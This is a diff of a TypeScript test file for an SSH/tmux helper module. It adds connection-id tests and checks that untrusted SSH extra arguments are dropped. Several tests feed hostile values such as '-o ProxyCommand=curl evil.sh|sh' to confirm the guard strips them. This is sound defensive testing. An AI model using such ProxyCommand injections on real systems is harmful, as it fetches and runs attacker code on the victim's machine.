@@ -9,6 +9,8 @@ import {
   remoteTmuxCommand,
   remoteTmuxConf,
   parseLsDirs,
+  sshAttachmentId,
+  sshConnectionIdForProject,
   sshHostKey
 } from './ssh'
 
@@ -23,6 +25,44 @@ describe('sshHostKey', () => {
   })
 })
 
+describe('sshAttachmentId', () => {
+  it('shares one scope per project and endpoint without exposing the host in a filename', () => {
+    const a = sshAttachmentId('project-1', {
+      host: 'ubuntu.lan',
+      user: 'corvin',
+      port: 22
+    })
+    expect(a).toBe(sshAttachmentId('project-1', { host: 'ubuntu.lan', user: 'corvin' }))
+    expect(a).not.toContain('ubuntu.lan')
+    expect(a).not.toBe(sshAttachmentId('project-2', { host: 'ubuntu.lan', user: 'corvin' }))
+    expect(a).not.toBe(sshAttachmentId('project-1', { host: 'ubuntu.lan', user: 'other' }))
+  })
+})
+
+describe('sshConnectionIdForProject', () => {
+  const ubuntu = { host: 'devbox', user: 'corvin', port: 2222 }
+
+  it('uses the project id when the project itself lives on that SSH endpoint', () => {
+    expect(sshConnectionIdForProject('project-1', ubuntu, { ...ubuntu })).toBe('project-1')
+  })
+
+  it('uses the host attachment when a remote node lives in a local project', () => {
+    expect(sshConnectionIdForProject('project-1', ubuntu)).toBe(
+      sshAttachmentId('project-1', ubuntu)
+    )
+  })
+
+  it("does not reuse an SSH project's connection for a node on another endpoint", () => {
+    expect(
+      sshConnectionIdForProject('project-1', ubuntu, {
+        host: 'another-host',
+        user: 'corvin',
+        port: 2222
+      })
+    ).toBe(sshAttachmentId('project-1', ubuntu))
+  })
+})
+
 describe('parseSshConfig', () => {
   it('parses a named host with HostName/User/Port/IdentityFile', () => {
     const cfg = `Host prod
@@ -31,13 +71,25 @@ describe('parseSshConfig', () => {
   Port 2222
   IdentityFile ~/.ssh/prod_ed25519`
     expect(parseSshConfig(cfg)).toEqual([
-      { label: 'prod', host: '10.0.0.5', user: 'deploy', port: 2222, identityFile: '~/.ssh/prod_ed25519' }
+      {
+        label: 'prod',
+        host: '10.0.0.5',
+        user: 'deploy',
+        port: 2222,
+        identityFile: '~/.ssh/prod_ed25519'
+      }
     ])
   })
 
   it('falls back to the alias when HostName is absent and leaves optional fields undefined', () => {
     expect(parseSshConfig('Host box\n  User me')).toEqual([
-      { label: 'box', host: 'box', user: 'me', port: undefined, identityFile: undefined }
+      {
+        label: 'box',
+        host: 'box',
+        user: 'me',
+        port: undefined,
+        identityFile: undefined
+      }
     ])
   })
 
@@ -49,7 +101,13 @@ Host *.internal
 Host real
   HostName r.example.com`
     expect(parseSshConfig(cfg)).toEqual([
-      { label: 'real', host: 'r.example.com', user: undefined, port: undefined, identityFile: undefined }
+      {
+        label: 'real',
+        host: 'r.example.com',
+        user: undefined,
+        port: undefined,
+        identityFile: undefined
+      }
     ])
   })
 
@@ -58,8 +116,20 @@ Host real
   HostName=h.example.com
   Port=22`
     expect(parseSshConfig(cfg)).toEqual([
-      { label: 'a', host: 'h.example.com', user: undefined, port: 22, identityFile: undefined },
-      { label: 'b', host: 'h.example.com', user: undefined, port: 22, identityFile: undefined }
+      {
+        label: 'a',
+        host: 'h.example.com',
+        user: undefined,
+        port: 22,
+        identityFile: undefined
+      },
+      {
+        label: 'b',
+        host: 'h.example.com',
+        user: undefined,
+        port: 22,
+        identityFile: undefined
+      }
     ])
   })
 })
@@ -75,13 +145,23 @@ describe('buildSshArgs', () => {
 
   it('custom port + identity file', () => {
     expect(
-      buildSshArgs({ host: 'h', user: 'u', port: 2222, identityFile: '/keys/id_ed25519' })
+      buildSshArgs({
+        host: 'h',
+        user: 'u',
+        port: 2222,
+        identityFile: '/keys/id_ed25519'
+      })
     ).toEqual(['-p', '2222', '-i', '/keys/id_ed25519', 'u@h'])
   })
 
   it('TRUSTED extra args are tokenized and inserted before the target', () => {
     expect(
-      buildSshArgs({ host: 'h', user: 'u', extraArgs: '-A -o ServerAliveInterval=30', execTrusted: true })
+      buildSshArgs({
+        host: 'h',
+        user: 'u',
+        extraArgs: '-A -o ServerAliveInterval=30',
+        execTrusted: true
+      })
     ).toEqual(['-p', '22', '-A', '-o', 'ServerAliveInterval=30', 'u@h'])
   })
 })
@@ -139,7 +219,12 @@ describe('remoteTmuxCommand', () => {
   })
   it('appends a quoted program + args when given', () => {
     expect(
-      remoteTmuxCommand({ sessionId: 'nt-x', remoteCwd: '/a', program: 'ssh', programArgs: ['-A', 'h'] })
+      remoteTmuxCommand({
+        sessionId: 'nt-x',
+        remoteCwd: '/a',
+        program: 'ssh',
+        programArgs: ['-A', 'h']
+      })
     ).toBe(`tmux -L nodeterm-rmt new-session -A -s 'nt-x' -c '/a' 'ssh' '-A' 'h'`)
   })
 })
@@ -187,11 +272,20 @@ describe('remoteTmuxConf', () => {
 
 describe('remoteTmuxCommand confPath', () => {
   it('adds -f <confPath> before new-session when given', () => {
-    const cmd = remoteTmuxCommand({ sessionId: 'nt-x', remoteCwd: '~/app', socket: 'nodeterm-rmt', confPath: '/home/u/.nodeterm/tmux.conf' })
+    const cmd = remoteTmuxCommand({
+      sessionId: 'nt-x',
+      remoteCwd: '~/app',
+      socket: 'nodeterm-rmt',
+      confPath: '/home/u/.nodeterm/tmux.conf'
+    })
     expect(cmd).toContain(`-f '/home/u/.nodeterm/tmux.conf' new-session`)
   })
   it('omits -f when no confPath', () => {
-    const cmd = remoteTmuxCommand({ sessionId: 'nt-x', remoteCwd: '~/app', socket: 'nodeterm-rmt' })
+    const cmd = remoteTmuxCommand({
+      sessionId: 'nt-x',
+      remoteCwd: '~/app',
+      socket: 'nodeterm-rmt'
+    })
     expect(cmd).not.toContain('-f ')
   })
 })
@@ -237,7 +331,9 @@ describe('stripLocalExecArgs', () => {
   })
 
   it('leaves every harmless arg untouched (a jump host, a keepalive, verbosity)', () => {
-    const ok = parseExtraArgs('-A -v -J jump.example -o StrictHostKeyChecking=no -o ServerAliveInterval=30')
+    const ok = parseExtraArgs(
+      '-A -v -J jump.example -o StrictHostKeyChecking=no -o ServerAliveInterval=30'
+    )
     expect(stripLocalExecArgs(ok)).toEqual({ args: ok, dropped: [] })
   })
 
@@ -255,29 +351,39 @@ describe('buildSshArgs exec guard', () => {
 
   it('refuses an untrusted ProxyCommand (a cloned project.json / a canvas-sync peer)', () => {
     expect(buildSshArgs({ ...base, extraArgs: '-o ProxyCommand=curl evil.sh|sh' })).toEqual([
-      '-p', '22', 'u@h'
+      '-p',
+      '22',
+      'u@h'
     ])
   })
 
-  it('honors the local user\'s OWN ProxyCommand (a corporate jump host still works)', () => {
+  it("honors the local user's OWN ProxyCommand (a corporate jump host still works)", () => {
     expect(
-      buildSshArgs({ ...base, extraArgs: '-o ProxyCommand=corp-proxy %h', execTrusted: true })
+      buildSshArgs({
+        ...base,
+        extraArgs: '-o ProxyCommand=corp-proxy %h',
+        execTrusted: true
+      })
     ).toEqual(['-p', '22', '-o', 'ProxyCommand=corp-proxy', '%h', 'u@h'])
   })
 
   // An untrusted list contributes NOTHING, whether or not it carries an exec-enabling option.
   it('degrades, never blocks — and contributes no untrusted tokens', () => {
-    expect(buildSshArgs({ ...base, port: 2222, extraArgs: '-A -o ProxyCommand=evil' })).toEqual([
-      '-p', '2222', 'u@h'
-    ])
+    expect(
+      buildSshArgs({
+        ...base,
+        port: 2222,
+        extraArgs: '-A -o ProxyCommand=evil'
+      })
+    ).toEqual(['-p', '2222', 'u@h'])
     expect(buildSshArgs({ ...base, extraArgs: '-o ProxyCommand=curl evil.sh|sh' })).toEqual([
-      '-p', '22', 'u@h'
+      '-p',
+      '22',
+      'u@h'
     ])
     // Even with nothing exec-enabling in it, an untrusted list is dropped whole: `-A`/`-J` from a
     // document are unwanted, and a bare positional would be read by ssh as the destination.
-    expect(buildSshArgs({ ...base, extraArgs: '-A -J jump.example' })).toEqual([
-      '-p', '22', 'u@h'
-    ])
+    expect(buildSshArgs({ ...base, extraArgs: '-A -J jump.example' })).toEqual(['-p', '22', 'u@h'])
     // A bare positional token: with no exec option it survives stripLocalExecArgs (dropped=[]), so
     // the OLD code passed it through and ssh took `evilhost` as the destination instead of u@h.
     expect(buildSshArgs({ ...base, extraArgs: 'evilhost' })).toEqual(['-p', '22', 'u@h'])
